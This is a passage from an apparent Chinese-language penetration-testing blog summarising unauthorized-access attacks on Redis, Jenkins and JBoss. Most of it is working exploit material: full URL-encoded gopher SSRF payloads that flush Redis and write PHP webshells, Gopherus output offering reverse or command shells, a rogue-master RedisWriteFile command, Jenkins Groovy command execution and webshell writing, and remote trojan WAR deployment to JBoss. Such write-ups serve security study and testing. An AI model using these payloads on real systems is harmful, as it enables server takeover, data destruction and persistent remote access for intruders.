plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chattr +i ~&#x2F;.ssh</span><br></pre></td></tr></table></figure></li></ul></li></ul><h6 id="redis主从复制漏洞"><a href="#redis主从复制漏洞" class="headerlink" title="redis主从复制漏洞"></a>redis主从复制漏洞</h6><p>主从复制</p><p>主从模式就是一个redis实例作为主机，其他实例作为备份机，但是主机和备份机数据相同，主机器负责写，从机器只负责读。通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>Redis模块</p><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。</p><p>然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h6 id="redis与gopger协议"><a href="#redis与gopger协议" class="headerlink" title="redis与gopger协议"></a>redis与gopger协议</h6><ul><li><p>gopher协议</p><p>gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，gopher是Internet上最主要的信息检索工具，gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p></li><li><p>gopher协议支持发出GET、POST请求</p><p>gopher协议格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><ul><li><p>gopher发送请求HTTP POST请求</p><p>POST与GET传参的区别：它有4个参数为必要参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~# curl gopher:&#x2F;&#x2F;172.20.10.3:8888&#x2F;_POST%20&#x2F;tes&#x2F;post.php%20HTTP&#x2F;1.1%0d%0AHost:172.20.10.3%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname&#x3D;purplet%0d%0A</span><br><span class="line">HTTP&#x2F;1.1 404 Not Found</span><br><span class="line">Date: Sun, 20 Sep 2020 09:04:49 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">Content-Length: 210</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL &#x2F;tes&#x2F;post.php was not found on this server.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>gopher发送请求HTTP GET请求</p><p>mac监听端口，kali尝试使用gopger发起get请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~# curl gopher:&#x2F;&#x2F;172.20.10.3:1234&#x2F;_abcd</span><br></pre></td></tr></table></figure><p>注意：steady是要传递的数据，_会被吃掉不会传递过去。</p><p>mac查看是否收到GET请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ncat -lnvp 1234</span><br><span class="line">abcd</span><br></pre></td></tr></table></figure><p>注意：abcd是要传递的数据，_会被吃掉不会传递过去。</p></li><li><p>gopher发送原始的请求包</p><p>gopher发送原始的http请求包</p><p>在gopher协议中发送HTTP的数据，需要以下三步：</p><p>1、构造HTTP数据包 </p><p>2、URL编码、替换回车换行为%0d%0a </p><p>3、发送gopher协议</p><p>新建php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.$_GET[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1、问号（？）需要转码为URL编码，也就是%3f</p><p>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</p><p>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p><p>4.、gopher协议后的IP一定要接端口</p><p>在mac上新建一个php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot;?&gt;</span><br></pre></td></tr></table></figure><p>正常浏览器访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.10.3:8888&#x2F;1.php?name&#x3D;11</span><br></pre></td></tr></table></figure><p>使用gopher协议访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~# curl gopher:&#x2F;&#x2F;172.20.10.3:8888&#x2F;_GET%20&#x2F;1.php?name&#x3D;11%20HTTP&#x2F;1.1%0d%0aHost:%20172.20.10.3%0d%0a</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sun, 20 Sep 2020 09:10:18 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP&#x2F;5.6.40</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">Hello 11</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure></li></ul></li><li><p>利用gopher协议向redis写shell</p><p>常见场景：</p><ul><li>1、目标redis公网不能直接访问。</li><li>2、能够利用ssrf漏洞</li></ul><p>mac生成poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python &#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;sec_tools-master&#x2F;redis-over-gopher&#x2F;redis-over-gopher.py</span><br><span class="line">gopher:&#x2F;&#x2F;172.20.10.10:6379&#x2F;_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span><br></pre></td></tr></table></figure><p>尝试使用gopger协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl gopher:&#x2F;&#x2F;172.20.10.10:6379&#x2F;_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure><p>成功写入webshell。</p><p>使用gopherus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  Gopherus python gopherus.py --exploit redis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> &#x2F;  _____&#x2F;  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">&#x2F;   \  ___ &#x2F;  _ \\____ \|  |  \_&#x2F; __ \_  __ \  |  \&#x2F;  ___&#x2F;</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___&#x2F;|  | \&#x2F;  |  &#x2F;\___ \</span><br><span class="line"> \______  &#x2F;\____&#x2F;|   __&#x2F;|___|  &#x2F;\___  &gt;__|  |____&#x2F;&#x2F;____  &gt;</span><br><span class="line">        \&#x2F;       |__|        \&#x2F;     \&#x2F;                 \&#x2F;</span><br><span class="line"></span><br><span class="line">author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell&#x2F;PHPShell): PHPSHELL</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is &#x2F;var&#x2F;www&#x2F;html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell):</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br><span class="line">When it&#39;s done you can get PHP Shell in &#x2F;shell.php at the server with &#96;cmd&#96; as parmeter.</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure></li></ul><h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><h6 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h6><ul><li>Windows的启动项和计划任务并不是以文本形式保存在固定位置的</li><li>Windows的Redis最新版本还停留在3.2，不可以利用主从漏洞getshell。</li></ul><h6 id="redis未授权访问漏洞利用与防御-1"><a href="#redis未授权访问漏洞利用与防御-1" class="headerlink" title="redis未授权访问漏洞利用与防御"></a>redis未授权访问漏洞利用与防御</h6><ul><li><p>有web环境</p><p>利用<code>RedisWriteFile</code>文件写入shell，脚本将自己模拟为master，设置对端为slave。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RedisWriteFile.py --rhost&#x3D;[target_ip] --rport&#x3D;[target_redis_port] --lhost&#x3D;[evil_master_host] --lport&#x3D;[random] --rpath&#x3D;&quot;[path_to_write]&quot; --rfile&#x3D;&quot;[filename]&quot; --lfile&#x3D;[filename]</span><br></pre></td></tr></table></figure></li><li><p>无web环境</p><ul><li><p>启动项</p><p>系统服务、计划任务、注册表启动项、用户的startup目录，前三种是无法通过单纯向某目录中写文件实现精准篡改的，因此只有startup目录可以利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>利用条件：</p><p>管理员将Redis添加了服务项并配了一个高权限（如Administrator甚至SYSTEM），并且主机重启才可以生效。</p></li><li><p>mof</p><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：<code>C:/windows/system32/wbem/mof/nullevt.mof</code>，其作用是每隔五秒就会去监控进程创建和死亡。</p><p>利用条件：</p><p>默认5秒执行一次的设定只有03及以下系统才会有</p></li><li><p>修改dll等。</p></li></ul></li></ul><h3 id="8080端口–Jenkins"><a href="#8080端口–Jenkins" class="headerlink" title="8080端口–Jenkins"></a>8080端口–Jenkins</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>默认情况下 Jenkins 面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>访问<code>http://xxxxx:8080/</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201124144533536.png" alt="image-20201124144533536"></p><p>但并不能证明是未授权访问，我们需要访问<code>xxxxx:8080/manage</code>，来验证是否成功。如果可以直接访问则表示未授权，否则直接跳转<code>http://xxxxx:8080/login?from=%2Fmanage</code>。</p><h5 id="未授权访问写shell"><a href="#未授权访问写shell" class="headerlink" title="未授权访问写shell"></a>未授权访问写shell</h5><p>直接访问脚本命令行</p><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &quot;whoami&quot;.execute().text</span><br></pre></td></tr></table></figure><p>写入文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new File (&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;).write(&#39;&lt;?php phpinfo(); ?&gt;&#39;);</span><br></pre></td></tr></table></figure><h3 id="jboss-未授权访问"><a href="#jboss-未授权访问" class="headerlink" title="jboss 未授权访问"></a>jboss 未授权访问</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>未授权访问管理控制台,通过该漏洞,可以后台管理服务,可以通过脚本命令执行系统命令,如反弹shell,wget写webshell文件。若是无需认证直接进入<code>jmx-console</code>控制页面的话,则有可能存在该漏洞。</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>使用apache搭建远程木马服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jsp马 jar -cvfM0 ma.war 1.jsp</span><br><span class="line">正在添加: 1.jsp(输入 &#x3D; 85033) (输出 &#x3D; 85033)(存储了 0%)</span><br></pre></td></tr></table></figure><p>点击<code>jboss.deployment</code>进入应用部署页面通过<code>addurl</code>参数进行木马的远程部署</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201127142612543.png" alt="image-20201127142612543"></p><p>访问木马地址<code>http://&lt;ip&gt;/shell.war</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;未授权访问漏洞总结&quot;&gt;&lt;a href=&quot;#未授权访问漏洞总结&quot; class=&quot;headerlink&quot; title=&quot;未授权访问漏洞总结&quot;&gt;&lt;/a&gt;未授权访问漏洞总结&lt;/h1&gt;&lt;h3 id=&quot;11211端口–memcache&quot;&gt;&lt;a href=&quot;#11211端口–m</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
